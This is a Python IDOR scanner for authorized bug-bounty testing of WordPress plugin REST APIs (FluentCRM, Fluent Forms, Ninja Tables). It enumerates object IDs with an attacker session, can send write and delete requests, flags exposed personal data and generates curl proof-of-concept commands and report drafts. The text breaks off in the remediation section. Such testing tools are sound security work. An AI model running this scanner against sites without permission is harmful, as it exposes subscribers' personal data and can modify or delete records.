#!/usr/bin/env python3
"""
idor_scanner.py — WordPress REST API IDOR Testing Module v2
BountyScope Workspace | @lucius-log | Wordfence Bug Bounty Program

Credentials via environment variables (preferred):
  BSCOPE_ATTACKER_COOKIE, BSCOPE_ATTACKER_NONCE
    BSCOPE_VICTIM_COOKIE,   BSCOPE_VICTIM_NONCE

Usage:
    python3 idor_scanner.py \\
        --target http://fluent-test.local \\
        --plugin fluentcrm \\
        --id-range 1-50 \\
        --attacker-cookie "$BSCOPE_ATTACKER_COOKIE" \\
        --attacker-nonce  "$BSCOPE_ATTACKER_NONCE"  \\
        --victim-cookie   "$BSCOPE_VICTIM_COOKIE"   \\
        --victim-nonce    "$BSCOPE_VICTIM_NONCE"    \\
        --skip-write --markdown-out report.md

Ethical use only. Only run against sites you own or have explicit written
permission to test. Wordfence BBP: https://www.wordfence.com/threat-intel/
"""

import argparse
import json
import os
import random
import re
import ssl
import sys
import time
import urllib.request
import urllib.error
from dataclasses import dataclass
from enum import Enum
from typing import Optional, Union


# ── Enums ──────────────────────────────────────────────────────────────────────

class Confidence(Enum):
    CONFIRMED    = "CONFIRMED"     # dual-session: attacker response matches owner
    LIKELY       = "LIKELY"        # single-session: HTTP 200 + real data fields
    INCONCLUSIVE = "INCONCLUSIVE"  # HTTP 200 but no clear data signal
    CLEAN        = "CLEAN"         # 401/403 — access correctly denied


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    NONE     = "NONE"


# CVSS 3.1 base score for authenticated IDOR with full PII read + write access.
# AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
#   ISS  = 1 - (1-0.56)(1-0.56)(1-0.00) = 0.8064
#   Impact = 6.42 × 0.8064 = 5.18
#   Exploitability = 8.22 × 0.85 × 0.77 × 0.62 × 0.85 = 2.84
#   BaseScore = Roundup(5.18 + 2.84) = 8.1 HIGH
CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS_SCORE  = "8.1"
CVSS_RATING = "HIGH"


# ── Plugin endpoint registry ───────────────────────────────────────────────────

PLUGIN_ENDPOINTS: dict[str, dict] = {
    "fluentcrm": {
        "namespace": "fluent-crm/v2",
        "endpoints": [
            {"path": "subscribers/{id}",                  "methods": ["GET", "PUT", "DELETE"], "label": "Subscriber record",    "pii": True,  "severity_read": "HIGH",   "severity_write": "CRITICAL"},
            {"path": "subscribers/{id}/notes",            "methods": ["GET", "POST"],          "label": "Subscriber notes",     "pii": True,  "severity_read": "MEDIUM", "severity_write": "HIGH"},
            {"path": "subscribers/{id}/emails",           "methods": ["GET"],                  "label": "Email history",        "pii": True,  "severity_read": "HIGH",   "severity_write": "NONE"},
            {"path": "subscribers/{id}/purchase-history", "methods": ["GET"],                  "label": "Purchase history",     "pii": True,  "severity_read": "HIGH",   "severity_write": "NONE"},
            {"path": "subscribers/{id}/tracking-events",  "methods": ["GET"],                  "label": "Behavioral tracking",  "pii": True,  "severity_read": "HIGH",   "severity_write": "NONE"},
            {"path": "subscribers/{id}/url-metrics",      "methods": ["GET"],                  "label": "URL click metrics",    "pii": False, "severity_read": "MEDIUM", "severity_write": "NONE"},
            {"path": "subscribers/{id}/form-submissions", "methods": ["GET"],                  "label": "Form submissions",     "pii": True,  "severity_read": "HIGH",   "severity_write": "NONE"},
            {"path": "campaigns/{id}",                    "methods": ["GET", "PUT", "DELETE"], "label": "Campaign record",      "pii": False, "severity_read": "MEDIUM", "severity_write": "HIGH"},
            {"path": "funnels/{id}",                      "methods": ["GET", "PUT", "DELETE"], "label": "Funnel record",        "pii": False, "severity_read": "MEDIUM", "severity_write": "HIGH"},
            {"path": "companies/{id}",                    "methods": ["GET", "PUT", "DELETE"], "label": "Company record",       "pii": True,  "severity_read": "MEDIUM", "severity_write": "HIGH"},
            {"path": "companies/{id}/notes",              "methods": ["GET", "POST"],          "label": "Company notes",        "pii": False, "severity_read": "LOW",    "severity_write": "MEDIUM"},
            {"path": "templates/{id}",                    "methods": ["GET", "PUT", "DELETE"], "label": "Email template",       "pii": False, "severity_read": "LOW",    "severity_write": "MEDIUM"},
        ],
    },
    "fluentform": {
        "namespace": "fluentform/v1",
        "endpoints": [
            {"path": "forms/{id}",             "methods": ["GET", "POST", "DELETE"], "label": "Form definition",   "pii": False, "severity_read": "MEDIUM", "severity_write": "HIGH"},
            {"path": "submissions/{id}",        "methods": ["GET"],                   "label": "Form submission",   "pii": True,  "severity_read": "HIGH",   "severity_write": "NONE"},
            {"path": "submissions/{id}/status", "methods": ["POST"],                  "label": "Submission status", "pii": False, "severity_read": "NONE",   "severity_write": "MEDIUM"},
        ],
    },
    "ninja-tables": {
        "namespace": "ninja-tables/v1",
        "endpoints": [
            {"path": "tables/{id}",               "methods": ["GET", "PUT", "DELETE"], "label": "Table data",   "pii": False, "severity_read": "MEDIUM", "severity_write": "HIGH"},
            {"path": "tables/{id}/rows",           "methods": ["GET", "POST"],          "label": "Table rows",   "pii": False, "severity_read": "MEDIUM", "severity_write": "HIGH"},
            {"path": "tables/{id}/rows/{row_id}",  "methods": ["PUT", "DELETE"],        "label": "Single row",   "pii": False, "severity_read": "NONE",   "severity_write": "MEDIUM"},
            {"path": "tables/{id}/export",         "methods": ["GET"],                  "label": "Table export", "pii": False, "severity_read": "MEDIUM", "severity_write": "NONE"},
            {"path": "tables/{id}/import",         "methods": ["POST"],                 "label": "Table import", "pii": False, "severity_read": "NONE",   "severity_write": "HIGH"},
        ],
    },
}

PII_KEYS = {
    "email", "first_name", "last_name", "phone", "address", "ip",
    "billing_address", "shipping_address", "user_email", "user_login",
    "subscriber_id", "contact_id",
}

DATA_KEYS = {
    "id", "subscriber", "contact", "campaign", "funnel", "template",
    "form", "submission", "rows", "data", "items", "results",
}


# ── Data structures ────────────────────────────────────────────────────────────

@dataclass
class ScanConfig:
    target: str
    plugin: str
    plugin_config_file: Optional[str]
    object_ids: list[str]
    secondary_id: str
    attacker_cookie: str
    attacker_nonce: str
    victim_cookie: Optional[str]
    victim_nonce: Optional[str]
    methods_filter: Optional[list[str]]
    skip_write: bool
    confirm_destructive: bool
    delay: float
    no_verify: bool
    json_out: Optional[str]
    markdown_out: Optional[str]


@dataclass
class ProbeResult:
    endpoint: str
    method: str
    label: str
    object_id: str
    path_template: str
    attacker_status: int
    attacker_body: str
    victim_status: Optional[int]
    victim_body: Optional[str]
    response_key_similarity: Optional[float]
    attacker_response_keys: list[str]
    victim_response_keys: list[str]
    confidence: Confidence
    severity: Severity
    evidence: str
    curl_poc: str
    pii_fields_found: list[str]

    def to_dict(self) -> dict:
        return {
            "endpoint": self.endpoint,
            "method": self.method,
            "label": self.label,
            "object_id": self.object_id,
            "attacker_status": self.attacker_status,
            "victim_status": self.victim_status,
            "response_key_similarity": self.response_key_similarity,
            "attacker_response_keys": self.attacker_response_keys,
            "victim_response_keys": self.victim_response_keys,
            "confidence": self.confidence.value,
            "severity": self.severity.value,
            "evidence": self.evidence,
            "pii_fields_found": self.pii_fields_found,
            "curl_poc": self.curl_poc,
            "response_preview": self.attacker_body[:500],
            "victim_response_preview": self.victim_body[:500] if self.victim_body else None,
        }


# ── TTY-aware color output ─────────────────────────────────────────────────────

_USE_COLOR = sys.stdout.isatty()

def _c(code: str) -> str:
    return code if _USE_COLOR else ""

class C:
    RED    = _c("\033[91m")
    GREEN  = _c("\033[92m")
    YELLOW = _c("\033[93m")
    BLUE   = _c("\033[94m")
    CYAN   = _c("\033[96m")
    BOLD   = _c("\033[1m")
    RESET  = _c("\033[0m")

    SEVERITY: dict[Severity, str] = {
        Severity.CRITICAL: _c("\033[95m"),
        Severity.HIGH:     _c("\033[91m"),
        Severity.MEDIUM:   _c("\033[93m"),
        Severity.LOW:      _c("\033[94m"),
        Severity.NONE:     "",
    }
    CONFIDENCE: dict[Confidence, str] = {
        Confidence.CONFIRMED:    _c("\033[91m\033[1m"),
        Confidence.LIKELY:       _c("\033[93m"),
        Confidence.INCONCLUSIVE: _c("\033[94m"),
        Confidence.CLEAN:        _c("\033[92m"),
    }


def banner():
    print(f"""
{C.CYAN}{C.BOLD}╔══════════════════════════════════════════════════════╗
║     BountyScope — WordPress IDOR Scanner v2          ║
║     @lucius-log | Wordfence BBP Research             ║
╚══════════════════════════════════════════════════════╝{C.RESET}
""")

def log_info(msg): print(f"  {C.BLUE}[*]{C.RESET} {msg}")
def log_ok(msg):   print(f"  {C.GREEN}[+]{C.RESET} {msg}")
def log_warn(msg): print(f"  {C.YELLOW}[~]{C.RESET} {msg}")
def log_fail(msg): print(f"  {C.RED}[-]{C.RESET} {msg}")
def log_fatal(msg): print(f"  {C.RED}[FATAL]{C.RESET} {msg}")


# ── SSL context ────────────────────────────────────────────────────────────────

def build_ssl_context(no_verify: bool) -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    if no_verify:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ── HTTP request ───────────────────────────────────────────────────────────────

def make_request(
    url: str,
    method: str,
    cookie: str,
    nonce: str,
    ssl_ctx: ssl.SSLContext,
    body: Optional[dict] = None,
    delay: float = 0.5,
    _retry: bool = True,
) -> tuple[int, str, dict]:
    time.sleep(delay * (1 + random.uniform(-0.2, 0.2)))

    headers = {
        "Cookie": cookie,
        "X-WP-Nonce": nonce,
        "User-Agent": "BountyScope-IDORScanner/2.0 (Authorized Security Research)",
        "Accept": "application/json",
    }

    data = None
    if body and method in ("PUT", "POST", "PATCH"):
        data = json.dumps(body).encode("utf-8")
        headers["Content-Type"] = "application/json"

    req = urllib.request.Request(url, data=data, headers=headers, method=method)

    try:
        with urllib.request.urlopen(req, timeout=15, context=ssl_ctx) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        if e.code == 429 and _retry:
            wait = int(e.headers.get("Retry-After", "60"))
            log_warn(f"Rate limited — waiting {wait}s before retry")
            time.sleep(wait)
            return make_request(url, method, cookie, nonce, ssl_ctx, body, delay, _retry=False)
        body_text = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body_text, dict(e.headers)
    except urllib.error.URLError as e:
        return 0, str(e.reason), {}


# ── Response analysis ──────────────────────────────────────────────────────────

def extract_keys(obj, depth: int = 0) -> set[str]:
    """Recursively collect all JSON keys up to depth 4."""
    if depth > 4:
        return set()
    keys: set[str] = set()
    if isinstance(obj, dict):
        for k, v in obj.items():
            keys.add(k.lower())
            keys |= extract_keys(v, depth + 1)
    elif isinstance(obj, list):
        for item in obj:
            keys |= extract_keys(item, depth + 1)
    return keys


def parse_json(body: str) -> Optional[Union[dict, list]]:
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        return None


def response_similarity(body_a: str, body_b: str) -> float:
    """Jaccard similarity on JSON key sets — 1.0 = identical structure."""
    data_a = parse_json(body_a)
    data_b = parse_json(body_b)
    if data_a is None or data_b is None:
        return 1.0 if body_a[:200] == body_b[:200] else 0.0
    keys_a = extract_keys(data_a)
    keys_b = extract_keys(data_b)
    if not keys_a and not keys_b:
        return 1.0
    union = keys_a | keys_b
    return len(keys_a & keys_b) / len(union)


def response_keys(body: Optional[str]) -> set[str]:
    if not body:
        return set()
    data = parse_json(body)
    return extract_keys(data) if data is not None else set()


def find_pii_fields(body: str) -> list[str]:
    data = parse_json(body)
    return sorted(extract_keys(data) & PII_KEYS) if data is not None else []


def find_data_fields(body: str) -> list[str]:
    data = parse_json(body)
    return sorted(extract_keys(data) & (DATA_KEYS | PII_KEYS)) if data is not None else []


# ── IDOR detection ─────────────────────────────────────────────────────────────

def assess_confidence(
    attacker_status: int,
    attacker_body: str,
    method: str,
    victim_status: Optional[int],
    victim_body: Optional[str],
) -> tuple[Confidence, str]:
    success_statuses = {200, 201, 202, 204}

    if attacker_status == 0:
        return Confidence.INCONCLUSIVE, f"Transport failure for attacker request: {attacker_body}"

    if victim_status == 0:
        return Confidence.INCONCLUSIVE, f"Transport failure for victim request: {victim_body}"

    # Dual-session comparison: authoritative when victim baseline is available.
    if victim_status is not None:
        if victim_status in (401, 403):
            return Confidence.INCONCLUSIVE, f"Victim baseline denied with HTTP {victim_status} — verify victim/admin session"

        if attacker_status in (401, 403) and victim_status in success_statuses:
            return Confidence.CLEAN, f"Attacker denied (HTTP {attacker_status}) while victim succeeded (HTTP {victim_status})"

        if attacker_status == 404 and victim_status in success_statuses:
            return Confidence.CLEAN, f"Attacker received HTTP 404 while victim succeeded (HTTP {victim_status})"

        if attacker_status == 404 and victim_status == 404:
            return Confidence.CLEAN, "HTTP 404 for both attacker and victim — resource not found"

        sim = response_similarity(attacker_body, victim_body or "")
        attacker_keys = response_keys(attacker_body)
        victim_keys = response_keys(victim_body)
        pii = find_pii_fields(attacker_body)
        pii_note = f" — PII: {', '.join(pii[:4])}" if pii else ""

        if attacker_status == victim_status and attacker_status in success_statuses:
            if sim >= 0.85:
                return Confidence.CONFIRMED, (
                    f"Attacker matched victim baseline (HTTP {attacker_status}, key similarity={sim:.0%}, "
                    f"attacker keys={len(attacker_keys)}, victim keys={len(victim_keys)}){pii_note}"
                )
            if sim >= 0.5:
                return Confidence.LIKELY, (
                    f"Attacker closely matched victim baseline (HTTP {attacker_status}, key similarity={sim:.0%})"
                )
            return Confidence.INCONCLUSIVE, (
                f"Attacker and victim both succeeded (HTTP {attacker_status}) but key similarity was only {sim:.0%}"
            )

        if attacker_status in success_statuses and victim_status in success_statuses:
            if sim >= 0.75:
                return Confidence.LIKELY, (
                    f"Attacker succeeded and strongly resembled victim baseline "
                    f"(HTTP {attacker_status} vs {victim_status}, key similarity={sim:.0%}){pii_note}"
                )
            return Confidence.INCONCLUSIVE, (
                f"Attacker succeeded (HTTP {attacker_status}) but differed from victim baseline "
                f"(HTTP {victim_status}, key similarity={sim:.0%})"
            )

        if attacker_status in success_statuses and victim_status not in success_statuses:
            return Confidence.INCONCLUSIVE, (
                f"Attacker succeeded (HTTP {attacker_status}) but victim baseline returned HTTP {victim_status}"
            )

    if attacker_status in (401, 403):
        data = parse_json(attacker_body)
        code = data.get("code", "") if isinstance(data, dict) else ""
        return Confidence.CLEAN, f"{code or f'HTTP {attacker_status}'} — access correctly denied"

    if attacker_status == 404:
        return Confidence.CLEAN, "HTTP 404 — resource not found"

    if attacker_status != 200:
        return Confidence.INCONCLUSIVE, f"HTTP {attacker_status} — unexpected response"

    # Single-session fallback
    data = parse_json(attacker_body)
    pii = find_pii_fields(attacker_body)

    if method == "DELETE" and isinstance(data, dict) and (data.get("success") or data.get("deleted")):
        return Confidence.LIKELY, "DELETE succeeded — resource deleted without ownership check"

    if method in ("PUT", "POST") and isinstance(data, dict):
        body_keys = extract_keys(data)
        if {"updated", "success", "modified"} & body_keys:
            return Confidence.LIKELY, "Write succeeded — resource modified without ownership check"

    if pii:
        return Confidence.LIKELY, f"HTTP 200 with PII fields: {', '.join(pii[:4])}"

    data_fields = find_data_fields(attacker_body)
    if data_fields:
        return Confidence.INCONCLUSIVE, f"HTTP 200 with data fields: {', '.join(data_fields[:4])} — manual review needed"

    return Confidence.INCONCLUSIVE, "HTTP 200 — no clear data signal, manual review needed"


# ── Severity classification ────────────────────────────────────────────────────

_SEVERITY_MAP = {
    "CRITICAL": Severity.CRITICAL,
    "HIGH":     Severity.HIGH,
    "MEDIUM":   Severity.MEDIUM,
    "LOW":      Severity.LOW,
}

def classify_severity(confidence: Confidence, method: str, ep_def: dict) -> Severity:
    if confidence in (Confidence.CLEAN, Confidence.INCONCLUSIVE):
        return Severity.NONE

    raw_key = "severity_read" if method in ("GET", "HEAD") else "severity_write"
    sev = _SEVERITY_MAP.get(ep_def.get(raw_key, "LOW"), Severity.LOW)

    # Downgrade unconfirmed findings one step
    if confidence == Confidence.LIKELY:
        order = [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.NONE]
        idx = order.index(sev)
        sev = order[min(idx + 1, len(order) - 1)]

    return sev


# ── PoC curl generation ────────────────────────────────────────────────────────

def build_curl_poc(url: str, method: str, cookie: str, nonce: str, body: Optional[dict]) -> str:
    cookie_display = cookie[:60] + "..." if len(cookie) > 60 else cookie
    lines = [
        f"curl -s -X {method} \\",
        f"  '{url}' \\",
        f"  -H 'Cookie: {cookie_display}' \\",
        f"  -H 'X-WP-Nonce: {nonce}'",
    ]
    if body:
        lines[-1] += " \\"
        lines += [
            "  -H 'Content-Type: application/json' \\",
            f"  -d '{json.dumps(body)}'",
        ]
    return "\n".join(lines)


# ── Write body templates ───────────────────────────────────────────────────────

def get_write_body(method: str, path_template: str) -> dict:
    if method == "PUT":
        if "subscribers" in path_template: return {"first_name": "IDOR_TEST_DO_NOT_IGNORE"}
        if "campaigns"   in path_template: return {"title": "IDOR_TEST_CAMPAIGN"}
        if "funnels"     in path_template: return {"title": "IDOR_TEST_FUNNEL"}
        if "companies"   in path_template: return {"name": "IDOR_TEST_COMPANY"}
        if "templates"   in path_template: return {"title": "IDOR_TEST_TEMPLATE"}
        return {"_idor_test": "1"}
    if method == "POST":
        if "notes" in path_template: return {"note": "IDOR test — authorized security research"}
        return {"_idor_test": "1"}
    return {}


# ── ID range parser ────────────────────────────────────────────────────────────

def parse_object_ids(
    id_range: Optional[str],
    id_list: Optional[str],
    id_file: Optional[str],
    single_id: Optional[str],
) -> list[str]:
    if id_range:
        parts = id_range.split("-")
        if len(parts) != 2 or not all(p.isdigit() for p in parts):
            raise ValueError(f"Invalid --id-range '{id_range}' — expected format: 1-50")
        return [str(i) for i in range(int(parts[0]), int(parts[1]) + 1)]
    if id_list:
        return [x.strip() for x in id_list.split(",") if x.strip()]
    if id_file:
        with open(id_file) as f:
            return [line.strip() for line in f if line.strip()]
    if single_id:
        return [single_id]
    raise ValueError("One of --object-id, --id-range, --id-list, --id-file is required")


# ── Plugin config loader ───────────────────────────────────────────────────────

def load_plugin_config(plugin: str, config_file: Optional[str]) -> dict:
    if config_file:
        with open(config_file) as f:
            return json.load(f)
    cfg = PLUGIN_ENDPOINTS.get(plugin)
    if not cfg:
        raise ValueError(f"Unknown plugin '{plugin}'. Built-in: {', '.join(PLUGIN_ENDPOINTS)}")
    if not cfg["endpoints"]:
        raise ValueError(f"Plugin '{plugin}' has no endpoints defined")
    return cfg


def preflight_target(config: ScanConfig, ssl_ctx: ssl.SSLContext):
    preflight_url = f"{config.target}/wp-json/"
    log_info(f"Preflight connectivity check: {preflight_url}")
    status, body, _ = make_request(preflight_url, "GET", "", "", ssl_ctx, None, delay=0)

    if status == 0:
        raise ConnectionError(f"Target unreachable at {preflight_url} — {body}")

    log_ok(f"Preflight reachable (HTTP {status})")


# ── Nonce expiry detection and refresh ────────────────────────────────────────

_NONCE_ERROR_CODES = {"rest_cookie_invalid_nonce", "rest_nonce_invalid", "rest_nonce_obsolete"}

# Ordered from most-specific to most-generic — first match wins
_NONCE_RE_PATTERNS = [
    re.compile(r'wpApiSettings\s*=\s*\{[^}]*?"nonce"\s*:\s*"([0-9a-f]{10})"'),
    re.compile(r'appVars\s*=\s*\{[^}]*?"nonce"\s*:\s*"([0-9a-f]{10})"'),
    re.compile(r'fcrm_nonce\s*[=:]\s*["\']([0-9a-f]{10})["\']'),
    re.compile(r'[Ff]luent[A-Za-z]+\s*=\s*\{[^}]*?"nonce"\s*:\s*"([0-9a-f]{10})"'),
    re.compile(r'"nonce"\s*:\s*"([0-9a-f]{10})"'),
]

_NONCE_REFRESH_PATHS = [
    "/wp-admin/admin.php?page=fluentcrm-admin",
    "/wp-admin/",
]


def is_nonce_error(status: int, body: str) -> bool:
    if status not in (401, 403):
        return False
    data = parse_json(body)
    return isinstance(data, dict) and data.get("code", "") in _NONCE_ERROR_CODES


def _fetch_fresh_nonce(target: str, cookie: str, ssl_ctx: ssl.SSLContext) -> Optional[str]:
    for path in _NONCE_REFRESH_PATHS:
        status, html, _ = make_request(
            f"{target}{path}", "GET", cookie, "", ssl_ctx, delay=0
        )
        if status == 200:
            for pattern in _NONCE_RE_PATTERNS:
                m = pattern.search(html)
                if m:
                    return m.group(1)
    return None


def refresh_nonces(config: ScanConfig, ssl_ctx: ssl.SSLContext) -> bool:
    """Refresh expired nonces in-place on config. Returns True if both succeed."""
    log_warn("Nonce expiry detected — refreshing sessions...")

    new_attacker = _fetch_fresh_nonce(config.target, config.attacker_cookie, ssl_ctx)
    if not new_attacker:
        log_warn("Could not refresh attacker nonce — session may have expired")
        return False
    config.attacker_nonce = new_attacker
    log_ok(f"Attacker nonce refreshed: {new_attacker}")

    if config.victim_cookie:
        new_victim = _fetch_fresh_nonce(config.target, config.victim_cookie, ssl_ctx)
        if not new_victim:
            log_warn("Could not refresh victim nonce — session may have expired")
            return False
        config.victim_nonce = new_victim
        log_ok(f"Victim nonce refreshed: {new_victim}")

    return True


# ── Core scanner ───────────────────────────────────────────────────────────────

def scan(config: ScanConfig) -> list[ProbeResult]:
    plugin_cfg = load_plugin_config(config.plugin, config.plugin_config_file)
    namespace = plugin_cfg["namespace"]
    endpoints = plugin_cfg["endpoints"]
    ssl_ctx = build_ssl_context(config.no_verify)
    dual = config.victim_cookie is not None
    results: list[ProbeResult] = []

    preflight_target(config, ssl_ctx)

    id_display = (
        f"{config.object_ids[0]}–{config.object_ids[-1]} ({len(config.object_ids)} total)"
        if len(config.object_ids) > 1 else config.object_ids[0]
    )
    print(f"\n{C.BOLD}Target:{C.RESET}    {config.target}")
    print(f"{C.BOLD}Plugin:{C.RESET}    {config.plugin}")
    print(f"{C.BOLD}IDs:{C.RESET}       {id_display}")
    print(f"{C.BOLD}Namespace:{C.RESET} /wp-json/{namespace}")
    print(f"{C.BOLD}Mode:{C.RESET}      {'dual-session (victim + attacker comparison)' if dual else 'single-session (attacker only)'}\n")
    print("─" * 70)

    for object_id in config.object_ids:
        if len(config.object_ids) > 1:
            print(f"\n{C.BOLD}── Object ID: {object_id} ──{C.RESET}")

        for ep in endpoints:
            path_template = ep["path"]
            label = ep["label"]
            methods = list(ep["methods"])

            if config.methods_filter:
                methods = [m for m in methods if m in config.methods_filter]
            if config.skip_write:
                methods = [m for m in methods if m == "GET"]
            if not config.confirm_destructive:
                methods = [m for m in methods if m != "DELETE"]
            if not methods:
                continue

            path = path_template.replace("{id}", object_id).replace("{row_id}", config.secondary_id)
            url = f"{config.target}/wp-json/{namespace}/{path}"
            print(f"\n  {C.CYAN}{label}{C.RESET}  {path}")

            for method in methods:
                body = get_write_body(method, path_template) if method in ("PUT", "POST") else None

                victim_body_arg = body if method in ("PUT", "POST") else None

                a_status, a_body, _ = make_request(
                    url, method,
                    config.attacker_cookie, config.attacker_nonce,
                    ssl_ctx, body, config.delay,
                )

                v_status, v_body = None, None
                if dual:
                    v_status, v_body, _ = make_request(
                        url, method,
                        config.victim_cookie, config.victim_nonce,  # type: ignore[arg-type]
                        ssl_ctx, victim_body_arg, config.delay,
                    )

                # Nonce expiry — retry once with fresh nonces
                if is_nonce_error(a_status, a_body) or (v_status is not None and is_nonce_error(v_status, v_body or "")):
                    if refresh_nonces(config, ssl_ctx):
                        a_status, a_body, _ = make_request(
                            url, method,
                            config.attacker_cookie, config.attacker_nonce,
                            ssl_ctx, body, config.delay,
                        )
                        if dual:
                            v_status, v_body, _ = make_request(
                                url, method,
                                config.victim_cookie, config.victim_nonce,  # type: ignore[arg-type]
                                ssl_ctx, victim_body_arg, config.delay,
                            )
                    else:
                        log_warn(f"Skipping {method} {url} — nonce refresh failed, session expired")
                        continue

                confidence, evidence = assess_confidence(a_status, a_body, method, v_status, v_body)
                severity = classify_severity(confidence, method, ep)
                pii_found = find_pii_fields(a_body)
                curl_poc = build_curl_poc(url, method, config.attacker_cookie, config.attacker_nonce, body)
                attacker_keys = sorted(response_keys(a_body))
                victim_keys = sorted(response_keys(v_body)) if v_body is not None else []
                key_similarity = response_similarity(a_body, v_body) if v_body is not None else None

                results.append(ProbeResult(
                    endpoint=url,
                    method=method,
                    label=label,
                    object_id=object_id,
                    path_template=path_template,
                    attacker_status=a_status,
                    attacker_body=a_body,
                    victim_status=v_status,
                    victim_body=v_body,
                    response_key_similarity=round(key_similarity, 4) if key_similarity is not None else None,
                    attacker_response_keys=attacker_keys,
                    victim_response_keys=victim_keys,
                    confidence=confidence,
                    severity=severity,
                    evidence=evidence,
                    curl_poc=curl_poc,
                    pii_fields_found=pii_found,
                ))

                sev_tag = ""
                if severity != Severity.NONE:
                    sev_color = C.SEVERITY.get(severity, "")
                    sev_tag = f" [{sev_color}{severity.value}{C.RESET}]"

                conf_color = C.CONFIDENCE[confidence]
                print(f"    {method:<8} HTTP {a_status}  {conf_color}{confidence.value}{C.RESET}{sev_tag}  {evidence}")

    return results


# ── Report: terminal summary ───────────────────────────────────────────────────

def print_summary(results: list[ProbeResult]):
    confirmed = [r for r in results if r.confidence == Confidence.CONFIRMED]
    likely    = [r for r in results if r.confidence == Confidence.LIKELY]
    total     = len(results)

    print("\n" + "═" * 70)
    print(f"{C.BOLD}SCAN SUMMARY{C.RESET}")
    print("═" * 70)
    print(f"  Total probes:    {total}")
    print(f"  Confirmed IDOR:  {C.RED}{C.BOLD}{len(confirmed)}{C.RESET}")
    print(f"  Likely IDOR:     {C.YELLOW}{len(likely)}{C.RESET}")
    print(f"  Clean:           {total - len(confirmed) - len(likely)}")

    actionable = confirmed + likely
    if actionable:
        print(f"\n{C.RED}{C.BOLD}FINDINGS:{C.RESET}")
        for r in sorted(actionable, key=lambda x: list(Severity).index(x.severity)):
            sev_color = C.SEVERITY.get(r.severity, "")
            print(f"\n  [{sev_color}{r.severity.value}{C.RESET}] {r.confidence.value} — {r.label} (ID {r.object_id})")
            print(f"  {r.method} {r.endpoint}")
            print(f"  {r.evidence}")
            if r.pii_fields_found:
                print(f"  PII detected: {', '.join(r.pii_fields_found)}")
            indented_poc = r.curl_poc.replace("\n", "\n  ")
            print(f"\n  PoC:\n  {indented_poc}")

        print(f"\n{C.YELLOW}Next steps:{C.RESET}")
        print("  1. Screenshot Caido request/response pairs for each finding")
        print("  2. Run BountyScope duplicate check: python3 main.py check <plugin>")
        print("  3. Use --markdown-out report.md to generate the Wordfence submission draft")
    else:
        print(f"\n{C.GREEN}No IDOR vulnerabilities detected.{C.RESET}")

    print()


# ── Report: JSON ───────────────────────────────────────────────────────────────

def save_json(results: list[ProbeResult], config: ScanConfig, outfile: str):
    confirmed = [r for r in results if r.confidence == Confidence.CONFIRMED]
    likely    = [r for r in results if r.confidence == Confidence.LIKELY]
    output = {
        "meta": {
            "target": config.target,
            "plugin": config.plugin,
            "object_ids": config.object_ids,
            "dual_session": config.victim_cookie is not None,
            "scan_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "scanner": "BountyScope-IDORScanner/2.0",
        },
        "summary": {
            "total_probes": len(results),
            "confirmed": len(confirmed),
            "likely": len(likely),
            "clean": len([r for r in results if r.confidence == Confidence.CLEAN]),
            "inconclusive": len([r for r in results if r.confidence == Confidence.INCONCLUSIVE]),
        },
        "findings": [r.to_dict() for r in confirmed + likely],
        "all_results": [r.to_dict() for r in results],
    }
    with open(outfile, "w") as f:
        json.dump(output, f, indent=2)
    log_ok(f"JSON report saved to {outfile}")


# ── Report: Markdown (Wordfence submission draft) ──────────────────────────────

def save_markdown(results: list[ProbeResult], config: ScanConfig, outfile: str):
    confirmed = [r for r in results if r.confidence == Confidence.CONFIRMED]
    likely    = [r for r in results if r.confidence == Confidence.LIKELY]
    findings  = confirmed + likely

    lines = [
        f"# IDOR Vulnerability Report — {config.plugin}",
        "",
        f"**Target:** {config.target}  ",
        f"**Plugin:** {config.plugin}  ",
        f"**Scan date:** {time.strftime('%Y-%m-%d', time.gmtime())}  ",
        f"**Scanner:** BountyScope-IDORScanner/2.0  ",
        f"**Mode:** {'Dual-session' if config.victim_cookie else 'Single-session'}  ",
        f"**IDs tested:** {', '.join(config.object_ids[:10])}{'...' if len(config.object_ids) > 10 else ''}  ",
        "",
        "## CVSS 3.1",
        "",
        f"| | |",
        f"|---|---|",
        f"| **Vector** | `{CVSS_VECTOR}` |",
        f"| **Base Score** | **{CVSS_SCORE} {CVSS_RATING}** |",
        f"| Attack Vector | Network |",
        f"| Attack Complexity | Low |",
        f"| Privileges Required | Low (authenticated CRM agent) |",
        f"| User Interaction | None |",
        f"| Scope | Unchanged |",
        f"| Confidentiality | High — full subscriber PII returned to unauthorized user |",
        f"| Integrity | High — PUT confirmed write access without ownership check |",
        f"| Availability | None |",
        "",
        "## Summary",
        "",
        "| Metric | Count |",
        "|--------|-------|",
        f"| Total probes | {len(results)} |",
        f"| Confirmed IDOR | {len(confirmed)} |",
        f"| Likely IDOR | {len(likely)} |",
        "",
    ]

    if not findings:
        lines.append("No IDOR vulnerabilities detected.")
    else:
        lines += ["## Findings", ""]

        for i, r in enumerate(findings, 1):
            lines += [
                f"### Finding {i}: {r.label} (`{r.method}`)",
                "",
                f"**Confidence:** {r.confidence.value}  ",
                f"**Severity:** {r.severity.value}  ",
                f"**Endpoint:** `{r.endpoint}`  ",
                f"**Evidence:** {r.evidence}  ",
            ]
            if r.pii_fields_found:
                lines.append(f"**PII fields exposed:** `{', '.join(r.pii_fields_found)}`  ")
            lines += [
                "",
                "#### Proof of Concept",
                "",
                "```bash",
                r.curl_poc,
                "```",
                "",
                "#### Attacker Response",
                "",
                "```json",
                r.attacker_body[:800],
                "```",
                "",
            ]
            if r.victim_body:
                lines += [
                    "#### Victim Baseline Response",
                    "",
                    "```json",
                    r.victim_body[:800],
                    "```",
                    "",
                ]

        lines += [
            "## Remediation",
            "",
            "Implement object-level authorization in each REST API callback. Example:",
            "",
            "```php",
            "// In the route handler — verify ownership after authentication",
